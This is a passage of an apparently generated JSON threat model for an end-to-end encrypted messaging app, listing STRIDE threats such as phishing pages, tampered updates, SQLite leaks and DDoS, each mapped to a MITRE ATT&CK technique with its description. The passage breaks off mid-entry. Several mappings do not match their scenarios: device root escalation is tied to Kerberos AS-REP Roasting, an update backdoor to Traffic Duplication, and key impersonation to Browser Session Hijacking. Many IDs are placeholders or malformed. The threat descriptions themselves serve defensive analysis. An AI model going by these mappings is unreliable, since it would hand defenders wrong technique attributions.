[
{
    "case_number": "13",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake frontend login page that looks identical to the legitimate messaging app's login page.",
            "Assumptions": [
                {
                    "Assumption": "Users might not recognize the fake page.",
                    "Role": "Users",
                    "Condition": "Users are not sufficiently trained to differentiate between fake and legitimate pages."
                },
                {
                    "Assumption": "The attacker can host and manage a similar-looking domain.",
                    "Role": "Attacker",
                    "Condition": "The attacker has the resources and capability to set up and manage a domain."
                },
                {
                    "Assumption": "Network traffic is not always secure.",
                    "Role": "Network Infrastructure",
                    "Condition": "Users access the internet through potentially unsecured or compromised networks."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data through credential theft.",
            "MITRE ATT&CK Keywords": [
                "Credential Harvesting",
                "Phishing",
                "Impersonation",
                "Login Page"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised primary device to send malicious links pretending to be a trusted user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the primary device.",
                    "Role": "Attacker",
                    "Condition": "The primary device has been compromised due to physical access or malware."
                },
                {
                    "Assumption": "Users trust messages from known contacts.",
                    "Role": "Users",
                    "Condition": "Users do not verify the authenticity of every message they receive from a known contact."
                },
                {
                    "Assumption": "The messaging encryption does not cover the content of links.",
                    "Role": "Messaging App",
                    "Condition": "Encryption protocols do not encrypt URLs sent within messages."
                }
            ],
            "Potential Impact": "Phishing link dissemination resulting in credential theft or malware installation.",
            "MITRE ATT&CK Keywords": [
                "Credential Harvesting",
                "Impersonation",
                "Link Manipulation",
                "Phishing"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nAdversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",
                "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
                "technique_id": "T1566.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a trusted encryption key to impersonate a user's identity on a companion device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker's device can obtain and use a legitimate user's private key.",
                    "Role": "Attacker",
                    "Condition": "The private key is inadequately protected."
                },
                {
                    "Assumption": "Users rely on the assumption that all companion devices are authenticated securely.",
                    "Role": "Users",
                    "Condition": "Users do not suspect that their identity could be compromised."
                },
                {
                    "Assumption": "Companion device setup does not have multi-factor authentication.",
                    "Role": "Messaging App",
                    "Condition": "Application setup does not use additional authentication mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access and confidentiality breach of communication.",
            "MITRE ATT&CK Keywords": [
                "Session Hijacking",
                "Key Theft",
                "Identity Impersonation",
                "E2EE Bypass"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters message content within SQLite databases on a compromised device.",
            "Assumptions": [
                {
                    "Assumption": "The device storing the SQLite database is compromised.",
                    "Role": "Attacker",
                    "Condition": "The attacker has gained access to the device through malware or physical means."
                },
                {
                    "Assumption": "SQLite databases are not adequately encrypted or protected.",
                    "Role": "Messaging App",
                    "Condition": "Improper or weak encryption protocols for SQLite databases."
                },
                {
                    "Assumption": "Users trust the device-stored data as authentic.",
                    "Role": "Users",
                    "Condition": "Users are not aware of potential tampering at the database level."
                }
            ],
            "Potential Impact": "Corruption of message integrity leading to misinformation or misunderstandings.",
            "MITRE ATT&CK Keywords": [
                "Data Tampering",
                "Local Database",
                "Message Alteration"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates public key distribution to introduce malicious encryption keys.",
            "Assumptions": [
                {
                    "Assumption": "Public key distribution protocol is vulnerable.",
                    "Role": "Messaging App",
                    "Condition": "Lack of rigorous verification methods for public keys."
                },
                {
                    "Assumption": "Users automatically trust provided public keys for encryption.",
                    "Role": "Users",
                    "Condition": "Users do not manually verify the authenticity of received public keys."
                },
                {
                    "Assumption": "The attacker's malefic key mimics legitimate keys.",
                    "Role": "Attacker",
                    "Condition": "The attacker can forge keys to appear legitimate."
                }
            ],
            "Potential Impact": "Interception and reading of encrypted messages by unauthorized actors.",
            "MITRE ATT&CK Keywords": [
                "Public Key Manipulation",
                "Key Distribution Attack",
                "Encryption Key Tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--4bf5845d-93ca-4738-8ae2-dfea8c0743b7",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Injection of malicious code into application updates.",
            "Assumptions": [
                {
                    "Assumption": "The software update channel is not fully secure.",
                    "Role": "Messaging App",
                    "Condition": "The update mechanism does not use end-to-end encryption."
                },
                {
                    "Assumption": "Users regularly update their applications.",
                    "Role": "Users",
                    "Condition": "Users download and install updates without verifying their source."
                },
                {
                    "Assumption": "The attacker has the capability to intercept and modify update packages.",
                    "Role": "Attacker",
                    "Condition": "The attacker controls a node in the update distribution network."
                }
            ],
            "Potential Impact": "Introduction of malware or backdoors into the application, compromising device security.",
            "MITRE ATT&CK Keywords": [
                "Code Injection",
                "Malicious Updates",
                "Software Supply Chain Attack"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user claims they did not send a particular message despite the application records.",
            "Assumptions": [
                {
                    "Assumption": "Users can delete messages locally.",
                    "Role": "Users",
                    "Condition": "The application allows for local deletion without trace."
                },
                {
                    "Assumption": "The application lacks non-reputable logging.",
                    "Role": "Messaging App",
                    "Condition": "Message logs are not tamper-proof and can be edited."
                },
                {
                    "Assumption": "Disputed message metadata is not adequately protected.",
                    "Role": "Messaging App",
                    "Condition": "Incomplete or insecure protection of message metadata."
                }
            ],
            "Potential Impact": "Inability to verify message authenticity and sender identity, leading to disputes and security lapses.",
            "MITRE ATT&CK Keywords": [
                "Message Deletion",
                "Audit Logging",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker exploits a flaw to alter message timestamps to create alibis or false sequences.",
            "Assumptions": [
                {
                    "Assumption": "The application timestamp mechanism is vulnerable.",
                    "Role": "Messaging App",
                    "Condition": "Weak implementation of message timestamps."
                },
                {
                    "Assumption": "The device's local time can be manipulated.",
                    "Role": "Users",
                    "Condition": "Device clock settings are not secured or monitored."
                },
                {
                    "Assumption": "Users rely on the application-provided timestamps.",
                    "Role": "Users",
                    "Condition": "Users assume timestamps are accurate and tamper-proof."
                }
            ],
            "Potential Impact": "Falsified message histories causing flawed records and potential legal issues.",
            "MITRE ATT&CK Keywords": [
                "Timestamp Manipulation",
                "Message Sequencing",
                "Time-based Repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern-- manipulation-of-timestamps-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user sends messages from a compromised device and denies it later.",
            "Assumptions": [
                {
                    "Assumption": "The compromised device's activities are not logged securely.",
                    "Role": "Messaging App",
                    "Condition": "Weak or no logging on companion device activities."
                },
                {
                    "Assumption": "Device access control measures are insufficient.",
                    "Role": "Users",
                    "Condition": "Low threshold for device physical/remote access security."
                },
                {
                    "Assumption": "Users trust activities from their authenticated devices.",
                    "Role": "Users",
                    "Condition": "Users rely on the inherent security of the companion device."
                }
            ],
            "Potential Impact": "Disputed responsibilities and actions within the application ecosystem, leading to confusion and security risks.",
            "MITRE ATT&CK Keywords": [
                "Device Compromise",
                "Activity Forging",
                "Access Denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts and decrypts messages due to weak encryption protocol implementation.",
            "Assumptions": [
                {
                    "Assumption": "The encryption protocol has a vulnerability.",
                    "Role": "Messaging App",
                    "Condition": "Implementation flaws in the encryption protocol."
                },
                {
                    "Assumption": "Network traffic is susceptible to interception.",
                    "Role": "Network Infrastructure",
                    "Condition": "Insecure network connections and paths."
                },
                {
                    "Assumption": "The attacker can use available computational resources to break encryption.",
                    "Role": "Attacker",
                    "Condition": "Adequate computational power to exploit protocol weaknesses."
                }
            ],
            "Potential Impact": "Unauthorized access to confidential communications.",
            "MITRE ATT&CK Keywords": [
                "Weak Encryption Protocol",
                "Message Interception",
                "Protocol Exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive SQLite database contents are leaked by a compromised device.",
            "Assumptions": [
                {
                    "Assumption": "The device gets compromised via malware or physical access.",
                    "Role": "Attacker",
                    "Condition": "Successful delivery and execution of malware or access to the device."
                },
                {
                    "Assumption": "SQLite databases are not securely encrypted.",
                    "Role": "Messaging App",
                    "Condition": "Weak or no encryption on the SQLite databases."
                },
                {
                    "Assumption": "Users store sensitive information locally.",
                    "Role": "Users",
                    "Condition": "Users enable local storage for sensitive data."
                }
            ],
            "Potential Impact": "Exposure of sensitive user data such as messages, pre-keys, and authentication credentials.",
            "MITRE ATT&CK Keywords": [
                "Data Leak",
                "SQLite Database",
                "Device Compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exfiltration of user information through a backdoor introduced via software updates.",
            "Assumptions": [
                {
                    "Assumption": "Software updates are not verified for authenticity.",
                    "Role": "Messaging App",
                    "Condition": "Lax checking of software updates' source and content."
                },
                {
                    "Assumption": "Users frequently update their applications.",
                    "Role": "Users",
                    "Condition": "Regular user activity involving application updates."
                },
                {
                    "Assumption": "The attacker can control parts of the update distribution process.",
                    "Role": "Attacker",
                    "Condition": "Compromised update distribution channels."
                }
            ],
            "Potential Impact": "Unauthorized access to user data through trojanized software.",
            "MITRE ATT&CK Keywords": [
                "Software Update Exploitation",
                "Backdoored Application",
                "Data Exfiltration"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the messaging application's server infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a botnet.",
                    "Role": "Attacker",
                    "Condition": "Control over multiple machines to execute the DDoS attack."
                },
                {
                    "Assumption": "Server infrastructure is vulnerable to DDoS.",
                    "Role": "Messaging App",
                    "Condition": "Insufficient protection mechanisms against high-volume traffic."
                },
                {
                    "Assumption": "Network capacity can be overwhelmed.",
                    "Role": "Network Infrastructure",
                    "Condition": "Limited network bandwidth to handle DDoS."
                }
            ],
            "Potential Impact": "Service disruption leading to unavailability of messaging services.",
            "MITRE ATT&CK Keywords": [
                "DDoS Attack",
                "Botnet",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the messaging application protocol to crash the app.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is aware of an unpatched vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Access to information about existing vulnerabilities."
                },
                {
                    "Assumption": "Users are using versions of the app with the known vulnerability.",
                    "Role": "Users",
                    "Condition": "User applications are not updated to the latest patch."
                },
                {
                    "Assumption": "The application has a software bug that can be exploited.",
                    "Role": "Messaging App",
                    "Condition": "Vulnerability exists within the app's protocol."
                }
            ],
            "Potential Impact": "Application crash, preventing users from communicating.",
            "MITRE ATT&CK Keywords": [
                "Vulnerability Exploitation",
                "Application Crash",
                "Protocol Exploit"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion attack where an attacker sends a large number of requests to consume device resources.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate automated requests.",
                    "Role": "Attacker",
                    "Condition": "Tools and resources to automate large volumes of requests."
                },
                {
                    "Assumption": "Devices have limited resources that can be overutilized.",
                    "Role": "Users",
                    "Condition": "Device hardware limitations."
                },
                {
                    "Assumption": "The application does not limit or manage request rates.",
                    "Role": "Messaging App",
                    "Condition": "Lack of rate limiting on incoming requests."
                }
            ],
            "Potential Impact": "Degraded performance or crashes of user devices.",
            "MITRE ATT&CK Keywords": [
                "Resource Exhaustion",
                "Automated Requests",
                "Performance Degradation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a privilege escalation vulnerability to gain root access on a device.",
            "Assumptions": [
                {
                    "Assumption": "The device operating system has a privilege escalation vulnerability.",
                    "Role": "Users",
                    "Condition": "Using outdated or unpatched device operating systems."
                },
                {
                    "Assumption": "The attacker can run code on the device.",
                    "Role": "Attacker",
                    "Condition": "Ability to execute code through a flaw in an app or via malware."
                },
                {
                    "Assumption": "The attacker aims to gain higher privileges.",
                    "Role": "Attacker",
                    "Condition": "Motivation to escalate privileges on the target device."
                }
            ],
            "Potential Impact": "Complete control over the device and sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Root Access",
                "Device Compromise"
            ],
            "mitre_technique": {
                "name": "AS-REP Roasting",
                "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
                "id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b",
                "technique_id": "T1558.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a flaw in the companion device linking mechanism to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The linking process has security weaknesses.",
                    "Role": "Messaging App",
                    "Condition": "Flaws in the design or implementation of the companion linking mechanism."
                },
                {
                    "Assumption": "The attacker has knowledge of the linking protocol.",
                    "Role": "Attacker",
                    "Condition": "Technical understanding of the linking process."
                },
                {
                    "Assumption": "Users do not monitor companion device activities.",
                    "Role": "Users",
                    "Condition": "Lack of user oversight on linked devices."
                }
            ],
            "Potential Impact": "Unauthorized access and potential data exfiltration from companion devices.",
            "MITRE ATT&CK Keywords": [
                "Companion Device",
                "Linking Exploit",
                "Access Control Weakness"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker injects malicious code that leverages application bugs to obtain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The application has exploitable bugs.",
                    "Role": "Messaging App",
                    "Condition": "Existence of software bugs that lack patches or mitigations."
                },
                {
                    "Assumption": "The attacker can deliver and execute exploit code.",
                    "Role": "Attacker",
                    "Condition": "Capability to send malicious payloads to the target device."
                },
                {
                    "Assumption": "Users utilize potentially vulnerable app versions.",
                    "Role": "Users",
                    "Condition": "Failure to update apps to the latest secure versions."
                }
            ],
            "Potential Impact": "Increased privileges allowing manipulation and access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Code Injection",
                "Bug Exploitation",
                "Privilege Gain"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
